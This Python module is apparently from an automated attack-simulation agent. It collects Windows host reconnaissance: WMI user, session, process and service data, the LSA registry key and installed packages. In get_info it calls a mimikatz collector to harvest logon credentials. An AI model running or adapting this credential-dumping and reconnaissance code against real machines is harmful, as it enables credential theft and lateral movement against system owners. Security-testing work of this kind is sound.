import os
import logging
import traceback

import sys
sys.coinit_flags = 0 # needed for proper destruction of the wmi python module
import wmi
import _winreg

from mimikatz_collector import MimikatzCollector
from . import InfoCollector

LOG = logging.getLogger(__name__)

__author__ = 'uri'

WMI_CLASSES = set(["Win32_OperatingSystem",
                   "Win32_ComputerSystem",
                   "Win32_GroupUser",
                   "Win32_LoggedOnUser",
                   "Win32_UserProfile",
                   "win32_UserAccount",
                   "Win32_Product",
                   "Win32_Process",
                   "Win32_Service"
                   ])

def fix_obj_for_mongo(o):
    if type(o) == dict:
        return dict([(k, fix_obj_for_mongo(v)) for k, v in o.iteritems()])
        
    elif type(o) in (list, tuple):
        return [fix_obj_for_mongo(i) for i in o]
        
    elif type(o) in (int, float, bool):
        return o
        
    elif type(o) in (str, unicode):
        # mongo dosn't like unprintable chars, so we use repr :/
        return repr(o)
        
    elif hasattr(o, "__class__") and o.__class__ == wmi._wmi_object:
        return fix_wmi_obj_for_mongo(o)
        
    else: 
        return repr(o)

def fix_wmi_obj_for_mongo(o):
    row = {}

    for prop in o.properties:
        try:
            value = getattr(o, prop)
        except wmi.x_wmi:
            continue

        row[prop] = fix_obj_for_mongo(value)

    for method_name in o.methods:
        if not method_name.startswith("GetOwner"):
            continue

        method = getattr(o, method_name)

        try:
            value = method()
            value = fix_obj_for_mongo(value)
            row[method_name[3:]] = value
            
        except wmi.x_wmi:
            #LOG.error("Error running wmi method '%s'" % (method_name, ))
            #LOG.error(traceback.format_exc())
            continue

    return row

class WindowsInfoCollector(InfoCollector):
    """
    System information collecting module for Windows operating systems
    """

    def __init__(self):
        super(WindowsInfoCollector, self).__init__()
        self.wmi = None

    def get_info(self):
        """
        Collect Windows system information
        Hostname, process list and network subnets
        Tries to read credential secrets using mimikatz
        :return: Dict of system information
        """
        LOG.debug("Running Windows collector")
        self.get_hostname()
        self.get_process_list()
        self.get_network_info()
        
        self.get_wmi_info()
        self.get_reg_key(r"SYSTEM\CurrentControlSet\Control\Lsa")
        self.get_installed_packages()
        
        mimikatz_collector = MimikatzCollector()
        self.info["credentials"] = mimikatz_collector.get_logon_info()
        self.info["mimikatz"] = mimikatz_collector.get_mimikatz_text()

        return self.info

    def get_installed_packages(self):
        self.info["installed_packages"] = os.popen("dism /online /get-packages").read()
        self.info["installed_features"] = os.popen("dism /online /get-features").read()
        
    def get_wmi_info(self):
        for wmi_class_name in WMI_CLASSES:
            self.info[wmi_class_name] = self.get_wmi_class(wmi_class_name)

    def get_wmi_class(self, class_name):
        if not self.wmi:
            self.wmi = wmi.WMI()

        try:
            wmi_class = getattr(self.wmi, class_name)()
        except wmi.x_wmi:
            #LOG.error("Error getting wmi class '%s'" % (class_name, ))
            #LOG.error(traceback.format_exc())
            return

        return fix_obj_for_mongo(wmi_class)

    def get_reg_key(self, subkey_path, store=_winreg.HKEY_LOCAL_MACHINE):
        key = _winreg.ConnectRegistry(None, store)
        subkey = _winreg.OpenKey(key, subkey_path)

        d = dict([_winreg.EnumValue(subkey, i)[:2] for i in xrange(_winreg.QueryInfoKey(subkey)[0])])
        d = fix_obj_for_mongo(d)

        self.info[subkey_path] = d

        subkey.Close()
        key.Close()